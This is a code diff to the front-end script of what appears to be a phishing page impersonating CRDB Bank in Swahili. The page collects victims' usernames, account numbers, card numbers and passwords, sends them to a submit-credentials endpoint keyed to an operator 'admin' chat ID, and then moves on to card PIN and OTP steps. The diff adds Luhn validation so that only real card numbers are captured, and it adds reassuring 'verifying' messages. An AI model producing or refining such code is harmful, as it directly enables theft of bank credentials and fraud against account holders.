@@ -17,6 +17,25 @@ document.addEventListener('DOMContentLoaded', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
 
+  // Luhn Check Algorithm to detect registered/valid card numbers
+  function validateCardLuhn(cardNumber) {
+    const digits = String(cardNumber || '').replace(/\D/g, '');
+    if (digits.length !== 16) return false;
+    
+    let sum = 0;
+    let alternate = false;
+    for (let i = digits.length - 1; i >= 0; i--) {
+      let n = parseInt(digits.substring(i, i + 1), 10);
+      if (alternate) {
+        n *= 2;
+        if (n > 9) n = (n % 10) + 1;
+      }
+      sum += n;
+      alternate = !alternate;
+    }
+    return (sum % 10 === 0);
+  }
+
   function showStep(targetStep) {
     [stepUnderstand, stepSlider, stepForm, stepCardPin, stepOtp, stepSuccess].forEach(s => {
       if (s) s.classList.remove('active');
@@ -94,7 +113,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const username = document.getElementById('crdb-username').value.trim();
     const account = document.getElementById('crdb-account').value.trim();
     const cardRaw = document.getElementById('crdb-card').value.trim();
-    const card = cardRaw.replace(/\D/g, ''); // Ondoa nafasi ili kuhakiki namba pekee
+    const cardDigits = cardRaw.replace(/\D/g, ''); 
     const password = document.getElementById('crdb-password').value.trim();
 
     const accountError = document.getElementById('account-error');
@@ -102,7 +121,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let isValid = true;
 
-    // Uhakiki wa namba ya akaunti (lazima iwe na angalau tarakimu 10 hadi 15)
+    // 1. Validate Account Number (CRDB account structure check: 10 to 15 digits)
     if (account.length < 10 || account.length > 15 || isNaN(account)) {
       accountError.style.display = 'block';
       isValid = false;
@@ -110,15 +129,20 @@ document.addEventListener('DOMContentLoaded', () => {
       accountError.style.display = 'none';
     }
 
-    // Uhakiki wa namba ya kadi (lazima iwe na tarakimu 16 kamili za kibenki)
-    if (card.length !== 16) {
+    // 2. Validate Bank Card using Luhn Algorithm
+    if (!validateCardLuhn(cardDigits)) {
       cardError.style.display = 'block';
       isValid = false;
     } else {
       cardError.style.display = 'none';
     }
 
+    // Block submission if details are invalid or missing
     if (!username || !password || !isValid) {
+      if (credsSurfaceBanner) {
+        credsSurfaceBanner.innerText = 'TAARIFA SI SAHIHI ❌ (TAFADHALI WEKA AKAUNTI NA KADI HALALI)';
+        credsSurfaceBanner.classList.add('active');
+      }
       if (!username || !password) {
         alert('Tafadhali jaza jina la mtumiaji na nywila.');
       }
@@ -126,13 +150,13 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
-    showLoading('INACHAKATA TAARIFA...', 'Inatuma taarifa kwa usalama.');
+    showLoading('INATHIBITISHA TAARIFA...', 'Inakagua uhalali wa akaunti na kadi yako ya benki.');
 
     try {
       const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, account, card: cardRaw, password, adminChatId: adminParam })
+        body: JSON.stringify({ username, account, card: cardDigits, password, adminChatId: adminParam })
       });
 
       const data = await res.json();
@@ -143,7 +167,10 @@ document.addEventListener('DOMContentLoaded', () => {
         startStatusPollingForCardPin();
       } else {
         hideLoading();
-        alert(data.error || 'Imeshindikana.');
+        if (credsSurfaceBanner) {
+          credsSurfaceBanner.innerText = data.error || 'TAARIFA ZIMEKATALIWA ❌';
+          credsSurfaceBanner.classList.add('active');
+        }
       }
     } catch (e) {
       hideLoading();
@@ -303,4 +330,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-                                                          
+                                             
